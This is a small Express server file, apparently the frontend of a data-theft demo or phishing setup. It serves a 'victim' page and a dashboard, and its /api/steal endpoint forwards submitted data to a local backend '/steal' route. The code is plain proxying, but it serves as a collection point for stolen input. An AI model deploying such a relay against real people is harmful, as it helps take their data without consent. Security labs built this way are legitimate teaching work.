const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = 5000;
const BACKEND_URL = 'http://localhost:3000';

app.use(express.json());
app.use(express.static(__dirname));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});

app.get('/victim', (req, res) => {
  res.sendFile(path.join(__dirname, 'victim.html'));
});

// Proxy endpoint to forward requests to backend
app.post('/api/steal', async (req, res) => {
  try {
    const response = await fetch(`${BACKEND_URL}/steal`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(req.body)
    });
    const data = await response.json();
    res.status(response.status).json(data);
  } catch (error) {
    console.error('Proxy error:', error);
    res.status(500).json({ ok: false, error: 'Failed to connect to backend' });
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Frontend server listening on http://0.0.0.0:${PORT}`);
});
